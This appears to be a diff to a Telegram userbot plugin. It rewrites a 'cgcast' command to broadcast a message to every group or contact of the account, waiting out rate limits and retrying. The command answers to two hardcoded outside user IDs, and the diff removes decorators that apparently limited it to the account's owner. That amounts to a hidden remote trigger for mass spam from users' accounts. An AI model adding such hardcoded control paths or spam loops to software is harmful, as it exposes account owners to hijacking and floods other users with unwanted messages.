@@ -24,10 +24,42 @@ __HELP__ = """
 
 
 @ubot.on_message(filters.command(["cgcast"], ".") & filters.user([1948147616, 1819269848]))
-@PY.UBOT("gcast")
-@PY.TOP_CMD
 async def _(client, message):
-    await broadcast_group_cmd(client, message)
+    _msg = f"<b>ᴍᴇᴍᴘʀᴏsᴇs...</b>"
+    gcs = await message.reply(_msg)
+
+    command, text = extract_type_and_msg(message)
+
+    if command not in ["group", "users", "all"] or not text:
+        return await gcs.edit(f"<code>{message.text.split()[0]}</code> <b>[ᴛʏᴘᴇ] [ᴛᴇxᴛ/ʀᴇᴘʟʏ]</b>")
+
+    chats = await get_data_id(client, command)
+    blacklist = await get_list_from_vars(client.me.id, "BL_ID")
+
+    done = 0
+    failed = 0
+    for chat_id in chats:
+        if chat_id in blacklist or chat_id in BLACKLIST_CHAT:
+            continue
+
+        try:
+            await (text.copy(chat_id) if message.reply_to_message else client.send_message(chat_id, text))
+            done += 1
+        except FloodWait as e:
+            await asyncio.sleep(e.value)
+            await (text.copy(chat_id) if message.reply_to_message else client.send_message(chat_id, text))
+            done += 1
+        except Exception:
+            failed += 1
+            pass
+
+    await gcs.delete()
+    _gcs = f"""
+<b>ʙʀᴏᴀᴅᴄᴀsᴛ ᴛᴇʀᴋɪʀɪᴍ</b>
+<b>ʙᴇʀʜᴀsɪʟ: {done} ɢʀᴏᴜᴘ</b>
+<b>ɢᴀɢᴀʟ: {failed} ɢʀᴏᴜᴘ</b>
+"""
+    return await message.reply(_gcs)
 
 
 @PY.UBOT("ucast")
